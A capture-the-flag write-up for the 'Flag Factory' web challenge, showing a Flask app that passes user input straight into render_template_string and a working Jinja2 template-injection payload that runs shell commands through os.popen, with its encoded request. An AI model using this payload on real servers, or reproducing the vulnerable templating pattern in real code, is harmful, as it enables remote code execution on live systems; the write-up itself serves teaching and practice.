---
title: "Flag Factory — Jinja2 SSTI to RCE"
pubDate: "2025-04-22"
type: "individual"
event: "Grey Cat CTF 2025"
author: "0xCat"
score: "300 pts"
tags: ["web"]
---

# Flag Factory (Web - 300 pts)

## Challenge Description
The challenge provided a Flask application that renders user-supplied templates dynamically without proper escaping or sandboxing.

## Analysis & Vulnerability
Inspecting `app.py`:

```python
from flask import Flask, render_template_string, request

app = Flask(__name__)

@app.route("/generate")
def generate():
    user_name = request.args.get("name", "Guest")
    template = f"<h1>Hello {user_name}</h1>"
    return render_template_string(template)
```

Because `render_template_string` formats `user_name` directly into the template string before compiling, arbitrary Jinja2 statements can be executed.

## Exploit Payload
We can traverse object classes to access Python's `os` module or `popen`:

```text
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}
```

Sending the request:
`GET /generate?name=%7B%7B%20self.__init__.__globals__.__builtins__.__import__(%27os%27).popen(%27cat%20/flag.txt%27).read()%20%7D%7D`

Flag captured: `grey{sst1_t3mpl4t3_1nj3ct10n_ftw}`
